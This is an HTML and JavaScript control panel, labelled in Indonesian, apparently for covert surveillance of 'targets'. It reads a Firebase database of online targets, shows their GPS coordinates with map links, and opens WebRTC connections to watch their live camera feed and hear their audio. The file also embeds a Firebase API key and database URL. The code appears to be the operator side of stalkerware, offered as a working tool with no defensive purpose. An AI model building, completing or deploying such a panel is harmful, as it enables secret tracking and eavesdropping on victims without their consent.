<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Master Panel Monitoring</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: 'Inter', sans-serif; display: flex; height: 100vh; margin: 0; }
        #sidebar { width: 300px; background: #1e293b; border-right: 1px solid #334155; padding: 20px; overflow-y: auto; }
        #main-view { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .target-card { background: #334155; padding: 15px; border-radius: 8px; margin-bottom: 10px; cursor: pointer; border: 1px solid transparent; }
        .target-card:hover { border-color: #38bdf8; }
        .target-card.active { background: #075985; border-color: #38bdf8; }
        #video-container { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #000; border-radius: 12px; overflow: hidden; border: 2px solid #38bdf8; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .controls { margin-top: 20px; background: #1e293b; padding: 20px; border-radius: 12px; width: 100%; max-width: 800px; }
        .btn { background: #38bdf8; color: #0f172a; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; }
        .status-badge { font-size: 12px; padding: 2px 8px; border-radius: 99px; background: #22c55e; color: white; }
    </style>
</head>
<body>
    <div id="sidebar">
        <h2 style="margin-top:0">Target Aktif</h2>
        <div id="target-list">Menunggu target...</div>
    </div>

    <div id="main-view">
        <h2 id="active-title">Pilih Target di Samping</h2>
        <div id="video-container">
            <video id="rv" autoplay playsinline></video>
        </div>
        <div class="controls">
            <button class="btn" onclick="activateAudio()">🔊 AKTIFKAN SUARA</button>
            <p id="loc-info">Koordinat: -</p>
            <button class="btn" style="background:#ef4444; color:white;" onclick="location.reload()">RELOAD PANEL</button>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f"
        };
        firebase.initializeApp(firebaseConfig);
        const rootDb = firebase.database().ref('multi_monitor');

        let currentTargetId = null;
        let pc = null;

        // 1. Pantau Daftar Target
        rootDb.on('value', snapshot => {
            const listDiv = document.getElementById('target-list');
            listDiv.innerHTML = "";
            const data = snapshot.val();
            
            if(!data) { listDiv.innerHTML = "Tidak ada target aktif."; return; }

            Object.keys(data).forEach(id => {
                const target = data[id];
                // Cek jika masih aktif (dalam 30 detik terakhir)
                if (target.status && Date.now() - target.status.lastSeen < 30000) {
                    const card = document.createElement('div');
                    card.className = `target-card ${id === currentTargetId ? 'active' : ''}`;
                    card.innerHTML = `<strong>${id}</strong> <span class="status-badge">ONLINE</span><br>
                                     <small>Lat: ${target.status.lat.toFixed(4)}, Lng: ${target.status.lng.toFixed(4)}</small>`;
                    card.onclick = () => selectTarget(id);
                    listDiv.appendChild(card);
                }
            });
        });

        // 2. Fungsi Memilih Target
        async function selectTarget(id) {
            if (currentTargetId === id) return;
            if (pc) pc.close();
            
            currentTargetId = id;
            document.getElementById('active-title').innerText = "Monitoring: " + id;
            addLog(`Menyambungkan ke ${id}...`);

            const db = rootDb.child(id);
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });

            pc.ontrack = e => { document.getElementById('rv').srcObject = e.streams[0]; };
            pc.onicecandidate = e => { if(e.candidate) db.child('ice_m').push(e.candidate.toJSON()); };

            // Ambil Offer dari Target tertentu
            db.child('sdp/offer').on('value', async s => {
                const o = s.val();
                if (o && id === currentTargetId && !pc.currentRemoteDescription) {
                    await pc.setRemoteDescription(new RTCSessionDescription(o));
                    const a = await pc.createAnswer();
                    await pc.setLocalDescription(a);
                    db.child('sdp/answer').set({ type: a.type, sdp: a.sdp });
                }
            });

            db.child('ice_t').on('child_added', s => {
                if (id === currentTargetId) pc.addIceCandidate(new RTCIceCandidate(s.val()));
            });

            db.child('status').on('value', s => {
                const d = s.val();
                if(d) document.getElementById('loc-info').innerHTML = `Koordinat: ${d.lat}, ${d.lng} | <a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank" style="color:#38bdf8">Buka Peta</a>`;
            });
        }

        function activateAudio() {
            const v = document.getElementById('rv');
            v.muted = false;
            v.play();
        }

        function addLog(m) { console.log(m); }
    </script>
</body>
</html>
